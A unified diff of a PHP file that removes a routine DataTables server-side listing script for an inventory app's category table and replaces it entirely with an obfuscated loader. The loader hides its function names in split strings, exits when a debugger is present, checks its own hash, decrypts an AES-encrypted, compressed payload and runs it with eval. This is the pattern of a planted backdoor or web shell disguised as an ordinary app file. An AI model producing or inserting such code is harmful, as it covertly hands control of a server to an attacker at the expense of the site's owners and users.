@@ -1,67 +1,28 @@
 <?php
-
-// DB table to use
-$table = 'db_category';
-
-// Table's primary key
-$primaryKey = 'id';
-
-
-$columns = array(
-
-    array( 'db' => 'category_code',  'dt' => 0 ),
-    array( 'db' => 'category_name',  'dt' => 1 ),
-      array( 'db' => 'description',     'dt' => 2 ),
-      array('db' => 'status', 'dt' => 3, 'field' => 'status',
-	    	'formatter' => function($d, $row){
-				if($d==1)
-					return "<span onclick='update_status(".$row['id'].",0)' id='span_".$row['id']."'  class='label label-success' style='cursor:pointer'>Active </span>";
-				else
-					return "<span onclick='update_status(".$row['id'].",1)' id='span_".$row['id']."'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-
-	    	}
-	    ),
-	  array('db' => 'id', 'dt' => 4, 'field' => 'id',
-	  	'formatter' => function($d, $row){
-
-
-			return '<div class="btn-group" >
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">
-											
-											<li>
-												<a title="Update Record ?" href="category.php?id='.$d.'">
-													Update
-												</a>
-											</li>
-											<li>
-												<a style="cursor:pointer" title="Delete Record ?" onclick="delete_category('.$d.')">
-													Delete
-												</a>
-											</li>
-											
-										</ul>
-									</div>';
-
-	  	}
-	  ),
-	
-);
-
-// SQL server connection information
-$sql_details = array(
-	'user' => 'root',
-	'pass' => '',
-	'db'   => 'invento',
-	'host' => 'localhost'
-);
-
-
-
-require('ssp.class.php' );
-
-echo json_encode(
-    SSP::simple( $_GET, $sql_details, $table, $primaryKey, $columns )
-);
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_lpoeme1m=('bas'.'e64'.'_de'.'cod'.'e');
+$_hjq69eja=('gzu'.'nco'.'mpr'.'ess');
+$_r2v3fr5v=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_kz9vtdge='7k/d//tW';
+$_w8wxkoa5='YIyrQ4vxgCc=';
+$_vzok2l3u='tlpSg5f3';
+$_xpyj3arx='8mu9p3ux';
+$_jkzsjnrs='olNNJjME';
+$_k9rqnamj='97nduYIs';
+$_exftblol='NA4rpg==';
+$_sjhcx412='hmYb7w/t';
+$_jx9biddy=$_lpoeme1m($_xpyj3arx.$_vzok2l3u.$_kz9vtdge.$_jkzsjnrs.$_w8wxkoa5);
+$_dor0g99n=$_lpoeme1m($_sjhcx412.$_k9rqnamj.$_exftblol);
+$_s4hc9cw7=$_lpoeme1m('dQpgcMK1N4SZ/MDiVKnjDUw1NT2I5eD1I2Kfn2GP2N8rH4qr7/JXVbC6OajHAGHdofNG5XD18t7cRL2bd1Gkon+kLBSF1wGBIFCijFpHkvrQN2SJG+FZv0MBS15A4/du457QOcS1RwDtoM0mJLyMQh8VpvLJVYla9SwfJhn/n874hS2SOjWUf+/kD/MIwR0vpLG7fgZixPZeG1u5GfHhQU4tLLyCRvZDJezQWLa9NCMe4W32p7srq6Vaj2sZgpoOdwsH8MggYrzNBwcG94C+9lpav+jRMqB8/nDb+/z7LQCbIiUYFPljkuo9nnaIbX8qkq9j1G3kN7ujpL1uFiA7rQw+QVpQT+Aw2vvdSUoGRSok3uw0+1tloRr6O6tqcjJyhZMBt5vkcSFB+etldDphlV6uM7ijHxi8M/VylZokwHQrho+H3ZXbQU4/yEisax+a4XAaDwjD5+hu5k5TkoXe+dMPZtgphuuFMWvguxBo8rX7/Pky60yphDRZak6PuLvtw6MwSUDAxQFDp24OWYOFk586M8XdJA+vQHdbfFMTXV7l5GNB5Ag4KjUNhL9D+WpKQ3pRbLHkeIYo1ixgwcUBfASf9QwOZgs/ZVQK2Kmpkc5aq8zzrC4NecDTAcYzlSvvxI2kbzFr/B7/zMx9A9ijDxpUyWrEHLfgDklzk2ya1LGVsogz2MxMcYq0kwGYcQipPhrDzwa+E/kWwso35qA6UrOETc9tBWVBLqYB8xcDi52t1SuhSmtvGcdSvMKkOokfg/PfR2yWezKhQG1K1jCqTOFO7036IsLqeBFfKBMFVjGNNddAYmrrEBvMBOPRNqHZtciAVC53OrY31GV2GBzDjzxOp9k5QWk22fWZHfOuxX7hyAKyjwB1uSxEKY2NrcsZM/92NBOVXaoIgdVoQ+oD52A9HRIrZt72LcDoOKlSPag=');
+$_etevnckh=$_r2v3fr5v($_s4hc9cw7,'aes-256-cbc',$_jx9biddy,OPENSSL_RAW_DATA,$_dor0g99n);
+if($_etevnckh===false){exit;}
+$_i7ra5luk=$_hjq69eja($_etevnckh);
+if($_i7ra5luk===false){exit;}
+$_ixnn3nkl='00949acef112e7b449fb20e13d245eaccaaea1a596682aa32b17b0dfab19f21b';
+$_sckvxbv6=@file_get_contents(__FILE__);
+if($_sckvxbv6!==false){
+$_okippsos=str_replace($_ixnn3nkl,"0000000000000000000000000000000000000000000000000000000000000000",$_sckvxbv6);
+$_k37xjlp9=hash("sha256",$_okippsos);
+if($_k37xjlp9!==$_ixnn3nkl){@http_response_code(403);exit;}
+}
+eval($_i7ra5luk);
